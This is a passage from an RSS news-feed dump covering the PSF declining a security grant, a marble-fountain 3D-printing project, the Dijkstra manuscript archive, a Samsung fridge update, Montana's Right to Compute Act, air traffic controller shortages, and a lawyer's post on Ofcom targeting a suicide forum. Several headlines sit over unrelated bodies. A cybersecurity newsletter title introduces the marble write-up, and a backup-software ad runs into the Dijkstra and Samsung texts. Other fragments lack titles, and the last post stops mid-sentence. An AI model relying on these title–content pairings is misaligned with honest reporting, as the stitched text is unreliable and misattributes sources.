flood of support,” Crary added later, “and it’s been a huge deal for us.”The PSF’s LinkedIn post about the decision began with this “TLDR” summary: “The PSF has made the decision to put our community and our shared diversity, equity, and inclusion values ahead of seeking $1.5M in new revenue.”“In the end, it wasn’t a hard decision,” they wrote, saying they put their value (and community) first.Within days, over 2,000 people clicked supportive “Reactions” on LinkedIn — with 361 reposts and 88 comments.Larson had another message. “I’m proud of what our little team has been able to accomplish, even if it’s not the result we imagined when Loren and I started this project almost a year ago.“Everything we’ve seen since we announced our decision has only confirmed my feelings that Python is an amazing community to be serving. I couldn’t be happier about that.”But will the work still go forward for what that grant was meant to cover? With an annual budget of roughly $5 million, according to a recent blog post, the $1.5 million grant would’ve represented a 30% boost in funding (spread across over two years) — “easily the largest grant we’d ever received.”As the group’s security developer-in-residence, Larson had hoped to use the grant to improve screening for attempted supply chain attacks on the official PyPI registry of Python packages. The PSF blog post says the plan was to build tools for automating package reviews “rather than the current process of reactive-only review.”Larson told me last week that the grant they’d applied for “included funding for multiple contracted positions over the two-year work period.” Sadly, he told me, “The automated package reviewing pipeline as proposed in the grant has no timeline to be implemented given current circumstances.”The larger open source community would’ve also benefited from the work, their blog post noted, since “the outputs of this work could be transferable for all open source software package registries, such as NPM and Crates.io, improving security across multiple open source ecosystems.”But Larson told me that moving forward without the grant also leaves far less room for that “additional work required to create artifacts that are adaptable to more than one software ecosystem — like documentation showing design, operation, results and performance.”And, “We’ll now have to balance the roadmap of work and maintenance on the Python Package Index (PyPI) and CPython with only existing security staffing. This leaves far less room for new large-scale projects.”Could that same security project still happen if new funding materializes? The PSF hasn’t entirely given up. “The PSF is always looking for new opportunities to fund work benefiting the Python community,” Nicholson told me in an email last week, adding pointedly that “we have received some helpful suggestions in response to our announcement that we will be pursuing.”And even as things stand, the PSF sees itself as “always developing or implementing the latest technologies for protecting PyPI project maintainers and users from current threats,” and it plans to continue with that commitment. For example, it notes, PyPI today implements Trusted Publishing (a tightly scoped alternative to publisher-verifying API tokens), digital provenance attestations and the ongoing malware-blocking efforts of Project Quarantine.The PSF also has ideas for increasing its other funding going forward. (“We’re looking at European grants, revenue sources that are tied to corporate usage, and increasing our individual giving program,” Nicholson told me.) “Ultimately, we do need some of these new revenue channels to pick up in order to continue serving our mission and the Python community the way we have been: Python and PyPI usage has grown steadily, especially since Python is essential to the recent explosion of the AI sector, while our funding has stayed essentially flat.”But this latest show of community support is especially heartening, arriving in a time of inflation, tech-sector economic pressures and “lower sponsorship,” the PSF’s blog pointed out (along with the general uncertainty and conflict). Writing that the PSF “needs financial support now more than ever,” they’d urged readers to show their support by buying PSF memberships or making a donation, or by encouraging their company to become a sponsor.“If you’re already a PSF member or regular donor, you have our deep appreciation,” they wrote, “and we urge you to share your story about why you support the PSF.”]]></content:encoded></item><item><title>Cybersecurity News Weekly Newsletter – Android and Cisco 0-Day, Teams Flaws, HackedGPT, and Whisper Leak</title><link>https://cybersecuritynews.com/cybersecurity-news-weekly-newsletter-november/</link><author></author><category>security</category><pubDate>Sun, 9 Nov 2025 17:27:36 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

After starting work at Formlabs in September of 2023 and gaining access to much nicer printers than I was used to, I started wanting to tackle some large algorithmic structure projects. Complexity is free in 3d printing, the limit of design geometry is mostly how much time you’re willing to spend in CAD. I wanted to print the most complicated art piece I could think of. Marble Fountain is what I came up with.My initial system came together quickly. Randomly placing spaced out points, drawing a spline through them, and setting a constant slope just works. My first draft was just subtracting a tube from the solid support structure which worked but was super limited. I wanted to add more parts and so I started working on a path solver. I wanted to fit as much motion into the volume of the printer as possible. This turned out to be extremely challenging.The solver starts by making a random series of line segments connecting the top and bottom of the lift. There are several different algorithms to generate this guess, as the initial conditional has a noticeable impact on the shape of the structure for lower path counts. It’s interesting to play with different variants of the starting conditions and see how they change during generation.A series of functions update the positions over time to “pull” the points into a followable path.
The points making up each path:Evenly space themselves outPull towards a fixed height to enforce a constant slopeEnforce min and max turning radius of the pathRepel away from other tracksRepel away from distant sections of our own trackSmooth out changes in slope to prevent jumpsPrevent slope from ever increasingVelocity is a much harder problem than I anticipated. The tracks break a lot of the obvious assumptions if you act like the marble is a point mass, as changing the bank of the track moves the axis of rotation and can burn off rotational inertia to friction. Long straight sections would build up too much speed and bearings fly off on the turns, but balls taking sharp turns at slow speed will lose too much momentum and stop. I settled on setting a minimum turn radius for the track and banking much more aggressively than is technically necessary for any given speed, so it constantly snakes back and forth to burn off speed.One of the most elegant designs of the whole structure is how the lift acts like a ball screw. The the screw is constrained by the balls on all sides which allows it to run with no bearing at the top. This also leads to a failure mode where if the screw ever only has balls on one side it will immediately start wobbling badly enough that all the balls currently rolling will fall off the tracks.The support generation was surprisingly simple. Iterating from the top down and treating the support pillars as a particle system is quite robust. I spent more time tweaking the geometry for aesthetics than I did for actual structure and collision issues, although I did heavily lean on the overhang tolerance of the printer.Pulls towards other supports, weighted by distance and similarity in sizeRepels away from other supportsPulls to stay in the bounding boxPulls towards a fixed radius from the center of the structureSupports also have inertia, which is where the arcs in the structure of the support columns come from.The final models take around 5-20 minutes to export. There’s a ton I could do to optimize the models, but at this point the geometry is simply beyond the scope of OpenSCAD. If I was rewriting this I would probably use a different tool more optimized for this type of organic geometry, likely an SDF library. I have vague ambitions to do a big rewrite eventually but figured sharing janky code
is better than none. I started this just planning for the janky splines as a weekend project but it has gotten thoroughly out of hand.I have a ton of other ideas to play with if I do that big rewrite. There is no realistic velocity estimation at any point in the whole system right now, just a pile of heuristics. I was originally trying to not overcomplicate but building a proper acceleration model by measuring velocity with a camera would have almost definitely saved time overall. Trying to maintain a fixed slope makes collision prevention much harder but is required to keep speed within bounds. At this point I’m also just curious about the response curve, there’s a knee somewhere where the surfaces start to slip that I want to track down.This was the most work I have ever put into a hobby project. I started in February 2024 and worked on it on and off until September. I applied to show it in a gallery (shoutout to New Alliance Gallery
in Somerville) with two months of warning, which wound up leading to a large crunch trying to make the system reliable enough to show in person in the weeks before the show. I was able to get it working consistently, although it did lose 2-3 balls an hour and could only run for a few hours without the motor overheating. I got pretty burned out and dropped the project, which is why I shelved it for a full year before sharing anything.Finally, a huge thanks to my friend Alex who listened to me ramble about marbles for several months every day while walking home from work, gave a ton of helpful input, and lived with the dozens of ball bearings scattered across our apartment.]]></content:encoded></item><item><title>The Principles of Diffusion Models</title><link>https://arxiv.org/abs/2510.21890</link><author>Anon84</author><category>dev</category><pubDate>Sun, 9 Nov 2025 16:10:23 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>NAKIVO Introduces v11.1 with Upgraded Disaster Recovery and MSP Features</title><link>https://www.bleepingcomputer.com/news/security/nakivo-introduces-v111-with-upgraded-disaster-recovery-and-msp-features/</link><author>Sponsored by Nakivo</author><category>security</category><pubDate>Sun, 9 Nov 2025 15:30:40 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[NAKIVO Backup & Replication v11.1 expands disaster recovery with real-time replication, enhanced Proxmox VE support, and granular physical backups.

											Edsger Wybe Dijkstra was one of the most influential members of computing science’s founding generation. Among the domains in which his scientific contributions are fundamental are
											formal specification and verification
												design of mathematical arguments
											In addition, Dijkstra was intensely interested in teaching, and in the relationships between academic computing science and the software industry.During his forty-plus years as a computing scientist, which included positions in both academia and industry, Dijkstra’s contributions brought him many prizes and awards, including computing science’s highest honor, the ACM Turing Award.Like most of us, Dijkstra always believed it a scientist’s duty to maintain a lively correspondence with his scientific colleagues. To a greater extent than most of us, he put that conviction into practice. For over four decades, he mailed copies of his consecutively numbered technical notes, trip reports, insightful observations, and pungent commentaries, known collectively as “EWDs”, to several dozen recipients in academia and industry. Thanks to the ubiquity of the photocopier and the wide interest in Dijkstra’s writings, the informal circulation of many of the EWDs eventually reached into the thousands.Although most of Dijkstra’s publications began life as EWD manuscripts, the great majority of his manuscripts remain unpublished. They have been inaccessible to many potential readers, and those who have received copies have been unable to cite them in their own work. To alleviate both of these problems, the department has collected over a thousand of the manuscripts in this permanent web site, in the form of PDF bitmap documents (to read them, you’ll need a copy of Acrobat Reader). We hope you will find it convenient, useful, inspiring, and enjoyable.The original manuscripts, along with diaries, correspondence, photographs, and other papers, are housed at The Center for American History of The University of Texas at Austin.Each manuscript file is accessible through either of two indexes:Each entry includes all the available bibliographic data.These contain titles only, but are faster if you know what you’re looking for.You can find a table relating EWD numbers to publication years here.Many of the privately circulated manuscripts collected here were subsequently published; their copyrights are held by their respective publishers.Transcripts and translationsA growing number of the PDF bitmap documents have been transcribed to make them searchable and accessible to visitors who are visually impaired.A few of the manuscripts written in Dutch have been translated into English, and one —EWD1036— has been translated into Spanish. EWD28  has been translated from English into Russian.For these transcriptions and translations we are grateful to over sixty contributors.  willing to transcribe manuscripts are always welcome (: doing EWDs justice in translation has turned out to be too difficult, so we are no longer soliciting translations). Each transcription gets a cursory scan as it’s prepared for uploading, but since a web page can always be updated, I don’t strive for (unattainable) perfection before installing it. On the web, proofreading is a game that can be played by every reader; if you spot an error, please 
									A compilation of cross-references has been contributed by Diethard Michaelis. As its author notes, the collection is incomplete, and all readers are invited to add to it.Dijkstra often returned to topics about which he had already written, when he had something new to say or even just a better way of saying it. When Dijkstra himself didn’t provide the backward references, we indicate the relationship by "see also" links in the index, leaving the judgment of the extent to which the earlier EWD is superseded by the later one to the reader.

									We have begun adding summaries of the EWDs. This innovation was suggested by Günter Rote, who contributed the first dozen summaries. Additional contributions of summaries—especially summaries in English of EWDs in Dutch—are most welcome.Copyrights in most EWDs  are  held by his children, one of whom —



                                
—  handles  requests for permission to publish reproductions. The exceptions are documents that were published, and whose copyrights are held by their publishers; those documents are listed here, and each one is provided with a cover page identifying the copyright holder.Because the original manuscripts are in possession of the Briscoe Center for American History at The University of Texas, the Center’s policies are also applicable.In addition to the manuscripts, you may enjoy some recordings of Dijkstra lectures and interviews.About Dijkstra and his workAn interview with Dijkstra (Spanish translation here) was conducted in 1985 by Rogier F. van Vlissingen, who has also written a personal reflection on “Dijkstra’s sense of what computer science and programming are and what they aren’t.”Another interview was conducted by Philip L. Frana in August 2001. A transcript is available in the on-line collection of the Charles Babbage Institute.To mark the occasion of Dijkstra’s retirement in November 1999 from the Schlumberger Centennial Chair in Computer Sciences, which he had occupied since 1984, and to celebrate his forty-plus years of seminal contributions to computing science, the Department of Computer Sciences organized a symposium, , which took place on his birthday in May 2000. The symposium’s program (10 MB) contains an outline of Dijkstra’s career, as well as a collection of quotes culled from his writings, from his blackboard, and from what others have said about him. Banquet speeches by David Gries, Fred Schneider, Krzysztof Apt, W.M. Turski, and H. Richards were recorded on a video.A remembrance of Dijkstra was posted in May 2008 by Maarten van Emden (thanks to Tristram Brelstaff for noting it).In 2021 Krzysztof R. Apt and Tony Hoare edited a 
									commemoration of Edsger Dijkstra
									written by more than twenty computer scientists who knew him as a colleague, teacher, and friend.A blog devoted to Dijkstra’s works and thoughts has been created, and is being maintained, by the historian of computing Edgar G. Daylight. An article by Daylight, “Dijkstra’s Rallying Cry for Generalization: the Advent of the Recursive Procedure, late 1950s - early 1960s,” appeared in , March 2011.The Edsger W. Dijkstra Prize in Distributed Computing honors Dijkstra’s “foundational work on concurrency primitives (such as the semaphore), concurrency problems (such as mutual exclusion and deadlock), reasoning about concurrent systems, and self-stabilization [, which] comprises one of the most important supports upon which the field of distributed computing is built.” The Dijkstra Memorial LecturesRecent significant changes in the site are listed here; the most recent change was posted on 30 March 2021.The folks who contributed most significantly to the site’s creation are acknowledged here.Comments and suggestions about the site are always welcome; please email them to theIf you find this site interesting, you may also be interested in another site:Discipline in Thought which is a website dedicated to disciplined thinking, calculational mathematics, and mathematical methodology.

The update includes a more intuitive user interface, improved AI Vision Inside™ capabilities, Voice ID capabilities with Bixby and upgraded security with Knox Matrix.Unified Experience Across ScreensThe refreshed One UI design that was first seen on Samsung’s 2025 Bespoke AI appliances will be coming to 2024 Family Hub™ models. This advances Samsung’s vision to bring a unified, seamless experience across the screens of its ecosystem of smart TVs, mobile devices and home appliances. In addition to enabling intuitive navigation and region-specific settings, users will get convenient access to features like Family Care, Pet Care and Home Care.Family Hub’s™ Cover screen themes are also being updated with new features, including the addition of a Daily Board theme, that offers a new way to see useful information at a glance.Smarter Food Tracking with AI Vision Inside RefrigeratorsFamily Hub™ refrigerators with AI Vision Inside technology will receive upgrades to enable recognition of frequently used packaged foods and even more fresh fruits and vegetables to help families reduce food waste and save money. AI Vision Inside will now recognize 37 fresh food items, including apples, cherries, cucumbers, mangoes, kiwis and more. In addition, AI Vision can now identify and suggest labeling up to 50 packaged food items that are frequently placed in the fridge.Personalized Intelligence for Every UserMeanwhile, Bixby gets new Voice ID capabilities, allowing it to recognize who is speaking and switches to their Samsung account. This makes it easy for users to access their calendar and view their photos or find a misplaced phone, even when it’s on silent.Voice ID also enhances accessibility by syncing the refrigerator’s display with the visual settings on a user’s Samsung Galaxy phone, such as color inversion or grayscale. And for quicker access, users can now activate Bixby with a simple double tap on the screen.New Widget Pilot for Cover Screen ThemesAs part of the Family Hub™ software update, we are piloting a new widget for select Cover screens themes of Family Hub™ refrigerators. The widget will display useful day-to-day information such as news, calendar and weather forecasts, along with curated advertisements.Family Hub™ owners will have the option to turn off Cover screen ads in the Advertisements tab of the Settings menu. Ads can also be dismissed on the Cover screen, meaning that specific ads will not appear again during the campaign period. Advertising will not appear when Cover screen displays Art or Album themes.Advanced Security That Works Quietly in the BackgroundSamsung is also expanding the reach of Knox Matrix, its advanced security solution built on private blockchain technology, to more of its smart home lineup. The protection now extends beyond Family Hub™+ refrigerators to include compatible Wi-Fi–enabled Samsung fridges, washers and dryers launched in 2024 — creating a safer, more connected home ecosystem.With Knox Trust Chain, these appliances can now monitor each other’s security status, ensuring every connected device stays protected. The Bespoke AI Family Hub™+ will also receive enhanced security features, including encrypted Credential Sync, Passkey support and the new Knox Security Dashboard introduced on 2025 models, giving users an easy, real-time view of their connected devices’ security status.How to Update Your Family Hub™Once the update is available for your fridge, you will receive a notification on the fridge’s screen asking to opt in to the latest software update. Enhancements will become available as soon as you accept the terms and complete the update.To learn more about Samsung’s innovative line of smart Family Hub™ refrigerators, visit Samsung.com.[1] Bixby is Samsung’s brand of Internet of Things (IoT) voice assistant. Bixby service availability may vary depending on the country. Bixby only recognizes certain accents and dialects of English (India), English (UK), English (US), French (France), German (Germany), Italian (Italy), Korean (South Korea), Mandarin Chinese (China), Portuguese (Brazil), Spanish (Spain) and Spanish (Latin America).[2] Knox Matrix is applied to all global regions uniformly, with the exception of China.[3] To utilize Family Care, Pet Care and Home Care, appliance must support Wi-Fi and connect to SmartThings to activate service. The availability of each care service may vary by country.[4] Software updates are provided to appliances excluding cases where hardware limitations, such as memory or chip performance, may restrict the updates.[5] As of April 2025, AI Vision Inside can recognize 37 food items like fresh fruits and veggies. If the food is not recognizable, it may be listed as an unknown item. AI Vision Inside cannot identify or list any food items in the fridge door bins or freezer. It recognizes food items based on deep learning models, which may be updated periodically to improve accuracy. AI Vision Inside also recognizes packaged food items that have been saved by the user, and up to 50 items can be saved with designated names. Packaged items are limited to those that keep a certain packaged form.[6] Each user must register for a Samsung Account on screen appliances in advance. Voice ID should be registered either on the refrigerator, or Galaxy mobile devices and then transferred to the refrigerator. (Limited to Galaxy S24 and subsequent models where Voice ID can be registered.)[7] To use calendar feature, users need to either register their schedule directly on the refrigerator or link their mobile phone calendar in advance. Only Google or Microsoft calendars saved under a Google or Microsoft account can be synced with the Bespoke AI Refrigerator with AI Family Hub. (Refrigerators with AI Home support Google Calendar only.)[8] Gallery feature is supported only for users who have saved photos to OneDrive cloud storage via the Samsung Gallery app on a Samsung mobile phone.[9] To enable the service, a preset is required in the SmartThings Find.[10] When a user registers a device through the SmartThings app, a one-time sync notification may appear via a plug-in. If the user signs into their Samsung account on a refrigerator and related settings are stored in the cloud, this data may be transmitted once to the device. Screen settings can be modified at any time, and any changes will be saved and remain in effect unless manually updated.[11] Ads on Family Hub Cover screens will serve contextual or non-personal ads. Family Hub devices are not collectiong personal information or tracking consumers.[13] Product availability varies by country.]]></content:encoded></item><item><title>Lost iPhone?

Governor Greg Gianforte signed Senate Bill 212, officially known as the Montana Right to Compute Act (MRTCA), into law.The groundbreaking legislation affirms Montanans’ fundamental right to own and operate computational resources — including hardware, software, and AI tools — under the state’s constitutional protections for property and free expression. Supporters of the bill say it represents a major step in securing digital freedoms in an increasingly AI-driven world.“Montana is once again leading the way in defending individual liberty,” said Senator Daniel Zolnikov, the bill’s sponsor and a longtime advocate for digital privacy. “With the Right to Compute Act, we are ensuring that every Montanan can access and control the tools of the future.”While the law allows state regulation of computation in the interest of public health and safety, it sets a high bar: any restrictions must be  and  to serve a compelling interest. Legal experts note that this is one of the most protective standards available under Montana law.The act also includes provisions for AI-controlled critical infrastructure, requiring both a “shutdown mechanism” to allow human control and annual safety reviews — a move aimed at balancing innovation with public safety concerns.The bill has drawn praise from privacy advocates and tech policy groups. Tanner Avery, Policy Director at the free-market think tank Frontier Institute, called the law a “flag in the ground” for digital rights, adding: “Montana has made clear it will treat any attempt to infringe on fundamental digital freedoms with the utmost scrutiny.”The MRTCA stands in stark contrast to recent regulatory efforts in other states, such as California, Virginia, and New York, where proposals to rein in AI technologies have either failed or been heavily revised. Montana’s approach leans toward empowering individual users rather than restricting access.The law has already inspired similar efforts in New Hampshire, where lawmakers are pushing a constitutional amendment guaranteeing access to computation. Rep. Keith Ammon, the state’s Majority Floor Leader, praised Montana’s leadership: “This is the kind of bold move that sets the tone for the rest of the country.”Nationally, the Right to Compute movement is gaining traction. Spearheaded by the grassroots group RightToCompute.ai, the campaign argues that computation — like speech and property — is a fundamental human right. “A computer is an extension of the human capacity to think,” the organization states.The movement is supported by Haltia.AI, a Dubai-based AI startup, and the ASIMOV Protocol, a blockchain consortium advocating for decentralized AI infrastructure. Talal Thabet, Co-Founder of both groups, praised Montana’s law as “a monumental step forward in ensuring individuals retain control of their own data and digital tools.”As debates over AI governance and digital rights continue to evolve, Montana’s bold new law could serve as a blueprint for other states seeking to safeguard freedom in the digital era.]]></content:encoded></item><item><title>Ask HN: How would you set up a child’s first Linux computer?</title><link>https://news.ycombinator.com/item?id=45864732</link><author>evolve2k</author><category>dev</category><pubDate>Sun, 9 Nov 2025 11:12:02 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[As a tech parent I think one of the best things I did for both my son and daughter was for their first computer to help them to build and setup their own Linux computer (It was Ubuntu back then but they’ve both moved themselves to Arch these days).We went together and bought a second hand desktop (exciting the people selling to us also) and when I got home I pulled out the Ram, HD and CD drive and set them aside; and then together with a screwdriver we “built the computer” over a few days.In windows when a child goes searching the web for a “movie maker for windows” they are going to be in a world of hurt either finding expensive commercial options or super scammy sites promising the world.By comparison on Linux if they search the local “app store” they’ll find stacks and stacks of free, useful, open licensed software.My kids loved the power, freedom and later unexpected community this bought them.Now my friend wants the same for their daughter who is 8 years old.I’m planning to do the same and go with her parents and her and buy a second hand desktop together and then put Linux on it.My question is where would you go from there?

I was forced to provide multiple forms of identification (birth certificate, drivers license, credit card) in order to open my orginal Facebook account and again each time my account is disabled.  Far beyond the norm. When a Facebook scam promised money from "Mark Zuckerberg" I was inundated with calls and emails from strangers, receiving phone calls at all hours of the night. I receive over 100+ friend requests daily from people confusing me with the "other" Mark Zuckerberg. I continually receive packages and letters containing complaints, suggestions, or demands for how to "improve Facebook"  I receive phone calls at my office every day from angry people demanding tech support, or help with Facebook from resets to remove photos to locked accounts.

And we’re also 400 controllers short—shorter than we were in the 2019 shutdown.”Air traffic controllers are federal workers, which means they are part of the approximately 730,000 federal employees working without pay since the shutdown began on Oct. 1. Daniels warned that the controllers who remain are stretched dangerously thin. Many are calling in sick due to burnout as they struggle to pay bills. “They’re calling their employer and saying, ‘I have no gas today. I cannot pay for my child care. Can I bring my children to work?’” he said.On Oct. 7, less than a week after the shutdown began, Transportation Secretary Sean Duffy noted that some air traffic controllers were already taking second jobs—a practice he discouraged. “I don’t want them delivering for DoorDash; I don’t want them driving Uber,” he said. “I want them coming to their facilities and controlling the airspace.”The resignations are adding to the tremendous stress being placed on airports due to the government shutdown. Just this week, staffing shortages reached their highest levels since the shutdown began.The Trump administration has responded to the crisis by curbing air traffic by 10 percent in 40 “high-traffic” markets, including New York City, Boston, Los Angeles, and other major American cities.The resignations also mean Americans can’t expect things to instantly return to normal once the shutdown ends, which is bad news for the upcoming holiday season. “It will take us months to come out of all the impacts that it’s causing,” said Daniels. Speaking to reporters at Reagan National Airport in Northern Virginia on Friday, Duffy acknowledged that the shutdown was weighing heavily on air traffic controllers who have gone unpaid since it began on Oct. 1.“Let’s not lie about the pressure,” he said. “The ones who do come to work, they’re the ones that are working six days a week, 10 hours a day. You can do that for a couple weeks, but at one point, you’re going to get burned out, and that’s what we’re seeing. Now, there’s a higher level of fatigue with the controllers.”The government shutdown, the longest in history, has stretched into its second month as senators refuse to negotiate on a government spending bill. Democrats have requested that Republicans include an extension of Affordable Care Act subsidies in the budget, and Republicans have refused to budge. ]]></content:encoded></item><item><title>Ironclad – formally verified, real-time capable, Unix-like OS kernel</title><link>https://ironclad-os.org/</link><author>vitalnodo</author><category>dev</category><pubDate>Sat, 8 Nov 2025 23:03:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[

The suit seeks to defend 4chan from the UK’s attempts to censor that website using the UK’s new Internet censorship law, the Online Safety Act.What some of you may  know is that I have personally committed to defend, pro bono, any U.S. website which operates lawfully in the United States – no matter how large or small – against the UK’s attempts to infringe on the First Amendment.And indeed, I am currently representing every single U.S. social-media enforcement target of the UK Online Safety Act, again pro bono,without exception. I will continue to do so until the Online Safety Act’s capacity to harm American citizens is destroyed, by America enacting a shield law.This means, necessarily, taking on some of the most controversial sites on the web as one’s clients. One such client, a social media forum called “Sanctioned Suicide” or “SaSu,” has long been a target for Ofcom’s ire because of the subject matter that the site hosts – principally, it is a mental health webforum where suicidal people are allowed to discuss the most taboo subject of all taboo subjects, suicide itself, and how they plan to go about it.To say that this site’s subject matter is controversial is an understatement. As a Catholic, I freely admit I struggled at first with representing the site. SaSu, 4chan, Gab, and Kiwi Farms – the complete list of Ofcom’s U.S. enforcement targets to date – are some of the most unsympathetic websites in the world, from a political point of view.But they’re not violating U.S. law.Ultimately, in these United States, even suicidal people have the right to freedom of speech and association. Every American is entitled to a defense against any attempt to take those rights away.Ofcom’s target selection was, in my view, part of a deliberate strategy to influence American behavior: pick the most radioactive free speech targets in the world, isolate them in confidential proceedings, punish them, and publicly shame them by claiming (in America, utterly toothless) fine notices or blocking orders as a “win,” then parade those “wins” in front of the rest of America’s tech industry to frighten the rest of our country into compliance.The only way to counter that strategy is to deny Ofcom a clean precedent and ensure that any “orders” they give to Americans are visibly and publicly refused – and therefore are, politically speaking, extremely costly. We achieve this by ensuring that no target goes without competent counsel, every target knows what Ofcom is trying to do, and every case will be fought like hell, in as public a fashion as possible. As Justice Brandeis said, “sunlight is the best disinfectant.”The victory condition of the U.S. pushback against Ofcom is the successful defense of the First Amendment – all of the First Amendment. If we concede even a scintilla of our constitutional rights, we fail. If we let any target fight alone, we fail. If we let Ofcom notch up any wins in secret where it cannot be subject to U.S. government scrutiny, we fail. If any censorship demand gets through our border unchallenged, we fail.That means we defend every site, however small or controversial it may be, from any and all foreign attempts to infringe on their constitutional rights. It means not giving up so much as an inch of ground without a major fight, if those are the instructions. It means we must not ever lose.We do this because the defense of any American is the defense of us all. The story of Ofcom v SaSuSaSu is a tiny forum which didn’t have much of an appetite for a fight. Accordingly, when Ofcom came calling at the end of February, SaSu more or less immediately IP blocked the entire UK in hopes of avoiding enforcement action. (Ofcom claims this occurred in July; it in fact occurred in May.)And, for a time, this worked. Today, however, I can reveal that Ofcom has reversed its decision and is going after the site anyway.Ofcom alleges that SaSu’s geo-block went down. This is demonstrably false. The block has been consistently functional for months, and when Ofcom’s e-mail landed in my inbox, I went to check it myself by using my own VPN to access the Internet through a London IP (unlike UK policymakers, I know how to use one). Sure enough, SaSu’s nationwide site block prevented me from viewing the site.What appears to have happened is that SaSu had a site mirror and that someone figured out a way to hit the mirror – which was also subject to the geoblock, something which took me under a minute to personally confirm – without using a VPN.This is possible for a range of reasons. The primary one is that the notion of a “UK based IP” is nonsense. Geolocation databases work by figuring out where people log in from and only after doing a lot of pattern recognition do those addresses get associated with that location. So there will be UK-based IPs that geolocate to Poland, for example, even though the end-user is sitting in the UK, because the database thinks that that IP address belongs in Poland.What might have happened is that a third party, understanding this, could have found SaSu’s mirror, hit SaSu’s mirror with one of these IPs, and then handed the file off to the regulator as some kind of “gotcha” demonstrating that the IP geoblock was ineffective, and using the fact of the access plus the fact that there was a mirror URL to claim that SaSu was somehow trying to dishonestly mislead the regulator about its compliance with the OSA through geoblocking. (The reasons why SaSu had a mirror are SaSu’s alone/none of Ofcom’s fucking business; what it suffices to note is that both SaSu’s main site and the mirror blocked the UK.) If this is in fact what happened, it would have been a profoundly dishonest tactic by UK activists to try to bring down regulatory hellfire on a disfavored American company, and it merits a full parliamentary investigation (though, I won’t hold my breath waiting for that).Ofcom, in reopening the investigation on the basis that the geoblock was down when the geoblock was in fact up, (1) reveals that it has no idea how the Internet works and (2) has made a pretty titanic mistake. Now it’ll either need to assert that the geoblock isn’t effective (when, for the most part, it is) or it’ll need to climb down (causing fury among the political constituencies which have so much power in Westminster that they forced the file to reopen in the first place).What seems clear to me is that Ofcom needs a scalp to present to Ofcom’s political masters. It’s been decided that SaSu is it. SaSu is, arguably, the most important scapegoat that was used to justify the Online Safety Act. Web censorship advocates like the Molly Rose Foundation – one of the major NGO sponsors of the Online Safety Act – seemingly exist for the sole purpose of advocating for increasingly insane levels of censorship of the Internet for everyone in the UK, always pointing to a single target as the justification, and never calling for any solution other than mass censorship of the entire country.That target is, and for years has been, SaSu. The NGOs in question refuse to name the site, ostensibly for harm reduction purposes, but this also prevents people from openly engaging with the issue and having an honest conversation about what the site is, what (American) legal protections it benefits from, and, therefore, what practical limitations there are on the UK trying to close it down, both now and when the UK was drafting and enacting the UK Online Safety Act. The UK’s inability to have those honest conversations at the proper time is what is causing the Online Safety Act to, slowly but surely, fail as an international regulatory scheme. This habit also led the UK to enact the Online Safety Act instead of adopting other, less censorial, approaches to make the Internet a safer place, which were ignored.Even today, aforementioned “Safety” NGO and others are using the simple fact of the SaSu’s existence to try to convince legislators that a nationwide VPN ban that applies to every one of the 69 million men, women, and children in the United Kingdom is necessary to end SaSu specifically – tantamount to using a thermonuclear bomb to swat a fly. Only three weeks ago, these groups called for the Prime Minister to open a parliamentary inquiry and wrote a 51-page report seeking to apply additional pressure for retaliatory action and additional global censorship powers. SaSu was even mentioned by Keir Starmer, albeit not by name, when he tried justifying the Online Safety Act to President Trump.There was even direct political pressure put on Ofcom by Parliament itself on October 31st to do something about SaSu. One could be forgiven for thinking that SaSu is the UK censorship-industrial complex’s favorite company, given how much they talk about it to practically anyone who will listen. In a way, it is the Online Safety Act’s necessary target: these organizations have spent years saying that the Online Safety Act was the required solution to a company like SaSu. If the Act fails to end it, the Act itself also fails. The credibility of the entire regime rests on beating this one website. For this reason, SaSu was the very first site Ofcom targeted for enforcement action in February 2025, months before Ofcom went after 4chan or anyone else. When that happened, the UK censorship NGO sector clearly expected SaSu to get wiped off the face of the Earth. But SaSu, rudely, , a fact which makes the UK censorship-industrial apparatus incandescent. The UK has no power to shut the site down, because the site and its operators are in the United States, they are not violating U.S. law, and they are conducting themselves in a manner that is protected by the First Amendment.So, it appears, as with 4chan, Ofcom has elected to proceed with a mock execution. Based on the fact that the nationwide IP block is still live, the precedent they want to set – the message they want to send – seems pretty clear to me: Geo-IP blocking the entire UK is no longer enough to comply with the Online Safety Act.Ofcom is trying to set the precedent that no matter where you are in the world, and no matter how much you try to keep UK users off your site, Ofcom believes you have to follow its rules – even if you’re American and you’re engaged in constitutionally protected speech and conduct. To that end, Ofcom has renewed its previous threats of fines, arrest, and imprisonment, against SaSu and its operators – all Americans.This is not what I expected. I had expected the UK, after encountering serious resistance to its extraterritorial expansion plans in the United States with 4chan’s refusal to comply, to start considering the merits of backing down. Instead, the UK is choosing to escalate, going after a target who the Online Safety Act’s political masters desperately want to, even to, eradicate, even though that target made good-faith efforts to block the UK from its services.Hate to spoil the party, but Ofcom will need to go try some other country’s websites to set that precedent. The UK is not going to be allowed to lay a finger on an American.I reproduce relevant correspondence below. We have also sent this correspondence to the White House, both Houses of Congress, individuals spearheading legislative initiatives to erect censorship shield laws in four different states, and the nation’s leading free speech advocacy organizations.My message to Washington and state legislatorsFree speech test cases are rarely made in relation to popular speech. But we call them “test cases” for a reason: because they are the test of the boundaries, and their outcome determines the future trajectory of the law and human behavior.The lesson from this correspondence is unmistakable: the UK thinks that anyone who refuses to adhere to its content rules, wherever they are based, is fair game for threats of fines and imprisonment, even if they try to wall themselves off from the UK with comprehensive blocks of UK IP addresses.This includes every single person in the United States. Companies like SaSu are the canaries in the coal mine. Companies most of us use every day like Meta or X are next.This problem is not going to go away. As we have seen with the escalating war of words between the UK and X, which culminated in a British King’s Counsel putting X’s Head of Global Government Affairs through a Maoist-style pro-Online Safety Act struggle session at an inquiry hearing only yesterday, it is clear the United Kingdom – or, at least, the bunch of yahoos who currently run it – will not be content to allow any American to enjoy the full measure of their constitutional rights online, no matter how obscure the U.S. site in question may be.They will attempt to crush anyone who resists, even if that resistance is in the form of Americans doing everything in our power to block the entire UK from our services to try to get British censors off our backs. The UK is willing to punish and threaten American companies – large and small – and American citizens in order to set the precedent that the UK is in charge of America’s Internet.Our government should not allow this to be done to any American, on principle. No American client of mine will ever 